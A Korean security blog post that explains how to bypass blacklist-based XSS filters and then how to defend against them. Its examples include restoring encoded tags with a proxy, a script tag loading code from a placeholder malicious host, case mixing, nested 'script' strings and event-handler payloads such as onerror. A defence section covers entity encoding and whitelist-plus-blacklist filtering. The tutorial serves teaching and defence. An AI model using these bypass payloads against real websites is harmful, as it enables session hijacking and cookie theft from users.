<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IERPTSBCYXNlZCBYU1Mg7Leo7JW97KCQIO2OmOydtOyngCDssL7quLAuXG7qs7XqsqnsnpAgLT4-IOqzteqyqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjrpbwg64u07J2AIFVSTCDrp4zrk6wuXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTOydhCDrs7TrgrTslrQg7YG066at7ZWY64-E66GdIOycoOuPhO2VnOuLpC5cbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDogVVJMIO2BtOumrVxu7IKs7Jqp7J6QIC0-PiDsm7kg7ISc67KEIDog7Y6Y7J207KeAIOyalOyyrVxu7Ju5IOyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog66-47JmE7ISxIO2OmOydtOyngCDsnZHri7VcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7Y6Y7J207KeAIOuPmeyggeycvOuhnCDsmYTshLFcbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuCDsi6TtlolcbuyCrOyaqeyekCAtPj4g6rO16rKp7J6QIDog66-86rCQ7ZWcIOygleuztCDsoITri6wiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h2 id="xss-bypass--우회방법-">XSS Bypass ( 우회방법 )</h2>
<ul>
  <li>서버에서 Black List 기반의 XSS 필터링을 적용 되었을 때의 우회방법이다.</li>
</ul>

<h3 id="client-side-검증-우회">Client Side 검증 우회</h3>
<ul>
  <li>Burp Suite (프록시 툴)을 이용하여 다시 원래대로 만들어 준다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>client side에서 치환된다.
&lt;script&gt; =&gt; &amp;lt;script&amp;gt;

프록시 툴로 다시 원래대로 만든다.
&amp;lt;script&amp;gt; =&gt; &lt;script&gt;
</code></pre></div></div>

<h3 id="script-load">Script Load</h3>
<ul>
  <li>XSS 공격할 때 글자 수가 제한되어 있다면 유용하다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="http://악성스크립트"&gt;&lt;/script&gt;
</code></pre></div></div>

<h3 id="대소문자-혼용하기">대소문자 혼용하기</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt; =&gt; &lt;ScRiPt&gt;
</code></pre></div></div>

<h3 id="필터링-되는-문자">필터링 되는 문자</h3>
<ul>
  <li>만약 서버에서 script 라는 문자를 빈칸으로 바꾼다면 다음과 같이 우회하면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt; =&gt; &lt;scrscriptipt&gt;
</code></pre></div></div>

<h3 id="eventhandler">EventHandler</h3>
<ul>
  <li>많은 태그와 이벤트 헨들러로 우회를 시도할 수 있다.</li>
  <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" title="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src=x onerror="alert(1)"&gt;
- onactivate
- onload

&lt;svg&gt;
&lt;audio src="" onplay="" autoplay&gt;
</code></pre></div></div>

<h2 id="대응-방안">대응 방안</h2>
<h3 id="html-entity">HTML Entity</h3>
<ul>
  <li>HTML 특수 문자들을 HTML Entity 로 모두 치환하면 된다.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>문자</th>
      <th>인코딩 된 문자</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&amp;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;amp;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;lt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">&gt;</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;gt;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">'</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#x27;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">"</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;quot;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">(</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#40;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">)</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#41;</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/</code></td>
      <td><code class="language-plaintext highlighter-rouge">&amp;#x2F;</code></td>
    </tr>
  </tbody>
</table>

<h3 id="문제점">문제점</h3>
<ul>
  <li>하지만 HTML Editor 게시판에서는 전부 치환을 못한다.</li>
  <li>잘 사용하지 않는 게시판이면 해당 게시판을 안쓰는 것이 좋다.</li>
  <li>잘 사용되는 게시판이라면 <strong>White List 기반 필터링</strong> 과 <strong>Black List 기반 필터링</strong>을 같이 적용해야한다.
    <blockquote>
      <p>step 1. 모든 HTML 특수 문자들을 HTML Entity 로 치환한다.<br /><br />
step 2. <strong>White List</strong> 기반 필터링으로 살려줄 (허용해줄) 태그를 살려 준다.<br />ex) img, p, a, …<br /><br />
step 3. <strong>Black List</strong> 기반으로 Event Handler를 필터링 하기.<br />ex) onerror, onload 막기</p>
    </blockquote>
  </li>
</ul>

<h2 id="참고">참고</h2>
<ul>
  <li><code class="language-plaintext highlighter-rouge">&lt;p&gt;</code> 태그 안에서는 <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> 태그가 안 먹힌다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://junhyunny.github.io/information/security/dom-based-cross-site-scripting/">DOM 기반 XSS(DOM based Cross Site Scripting) 공격과 방어 - Junhyunny’s Devlogs</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="웹 해킹" /><category term="javascript" /><category term="html" /><summary type="html"><![CDATA[XSS ( Cross-Site Scripting ) 란 클라이언트 측 스크립트를 삽입하는 공격이다. 웹 애플리케이션에서 발생하는 취약점이다. 클라이언트 만이 피해를 입는다. 즉 서버에는 아무런 악영향을 안 끼친다. 클라이언트의 브라우저에서 개발자가 의도하지 않았던 스크립트가 실행된다. 취약한 웹 애플리케이션을 이용하는 사용자가 주 타겟이 된다. 사용자 쿠키를 탈취하는 세션 하이재킹( session hijacking ) 공격을 수행할 수 있다.]]></summary></entry></feed>